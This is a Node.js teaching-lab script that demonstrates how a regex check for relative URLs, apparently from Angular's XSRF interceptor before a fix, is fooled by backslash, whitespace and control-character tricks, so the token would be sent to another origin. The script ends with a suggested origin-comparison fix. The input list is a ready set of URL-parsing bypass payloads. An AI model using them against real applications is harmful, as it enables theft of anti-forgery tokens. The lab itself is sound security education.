// Lab 1 without a browser: who decides where a URL goes?
// The check below is the regex Angular's XSRF interceptor used before 21.0.3 / 20.3.34.
// Node's URL is the same WHATWG parser that fetch() and XHR use in the browser.

const PAGE = 'http://localhost:4000';
const looksRelative = (url) => !/^(?:https?:)?\/\//i.test(url);

const inputs = [
  ['same origin (control)', '/api/promos/chicha/save'],
  ['protocol-relative (control)', '//localhost:9999/collect'],
  ['absolute (control)', 'http://localhost:9999/collect'],
  ['backslash', '/\\localhost:9999/collect'],
  ['backslash, then slash', '\\/localhost:9999/collect'],
  ['leading space', ' //localhost:9999/collect'],
  ['leading tab', '\t//localhost:9999/collect'],
  ['leading space and tab', ' \t//localhost:9999/collect'],
  ['inner tab', '/\t/localhost:9999/collect'],
  ['inner line feed', '/\n/localhost:9999/collect'],
  ['inner carriage return', '/\r/localhost:9999/collect'],
  ['leading NUL', '\u0000//localhost:9999/collect'],
  ['leading U+001F', '\u001f//localhost:9999/collect'],
  ['http: and two backslashes', 'http:\\\\localhost:9999/collect'],
  ['http: slash and backslash', 'http:/\\localhost:9999/collect'],
  ['tab inside the scheme', 'ht\ttp://localhost:9999/collect'],
  ['same host, other port', '/\\127.0.0.1:9999/collect'],
];

const show = (value) =>
  `'${value
    .replace(/\t/g, '\\t')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\u0000/g, '\\0')
    .replace(/\u001f/g, '\\x1f')}'`;

const rows = inputs.map(([label, input]) => {
  const relative = looksRelative(input);
  const destination = new URL(input, PAGE).origin;
  const leaks = relative && destination !== PAGE;
  return { label, input: show(input), relative, destination, leaks };
});

const pad = (text, width) => String(text).padEnd(width);
console.log(`\nPage origin: ${PAGE}\n`);
console.log(
  `${pad('case', 28)}${pad('input', 36)}${pad('regex says', 13)}${pad('fetch() sends to', 24)}token`,
);
console.log('-'.repeat(108));
for (const row of rows) {
  const verdict = row.leaks
    ? '\x1b[31mLEAKS\x1b[0m'
    : row.destination === PAGE
      ? 'stays home'
      : 'not attached';
  console.log(
    `${pad(row.label, 28)}${pad(row.input, 36)}${pad(row.relative ? 'relative' : 'absolute', 13)}${pad(row.destination, 24)}${verdict}`,
  );
}

const leaks = rows.filter((row) => row.leaks).length;
console.log(
  `\n${leaks} of ${rows.length} inputs: the regex says "ours", the browser sends them somewhere else.`,
);
console.log('Fix: new URL(req.url, location.origin).origin === location.origin\n');
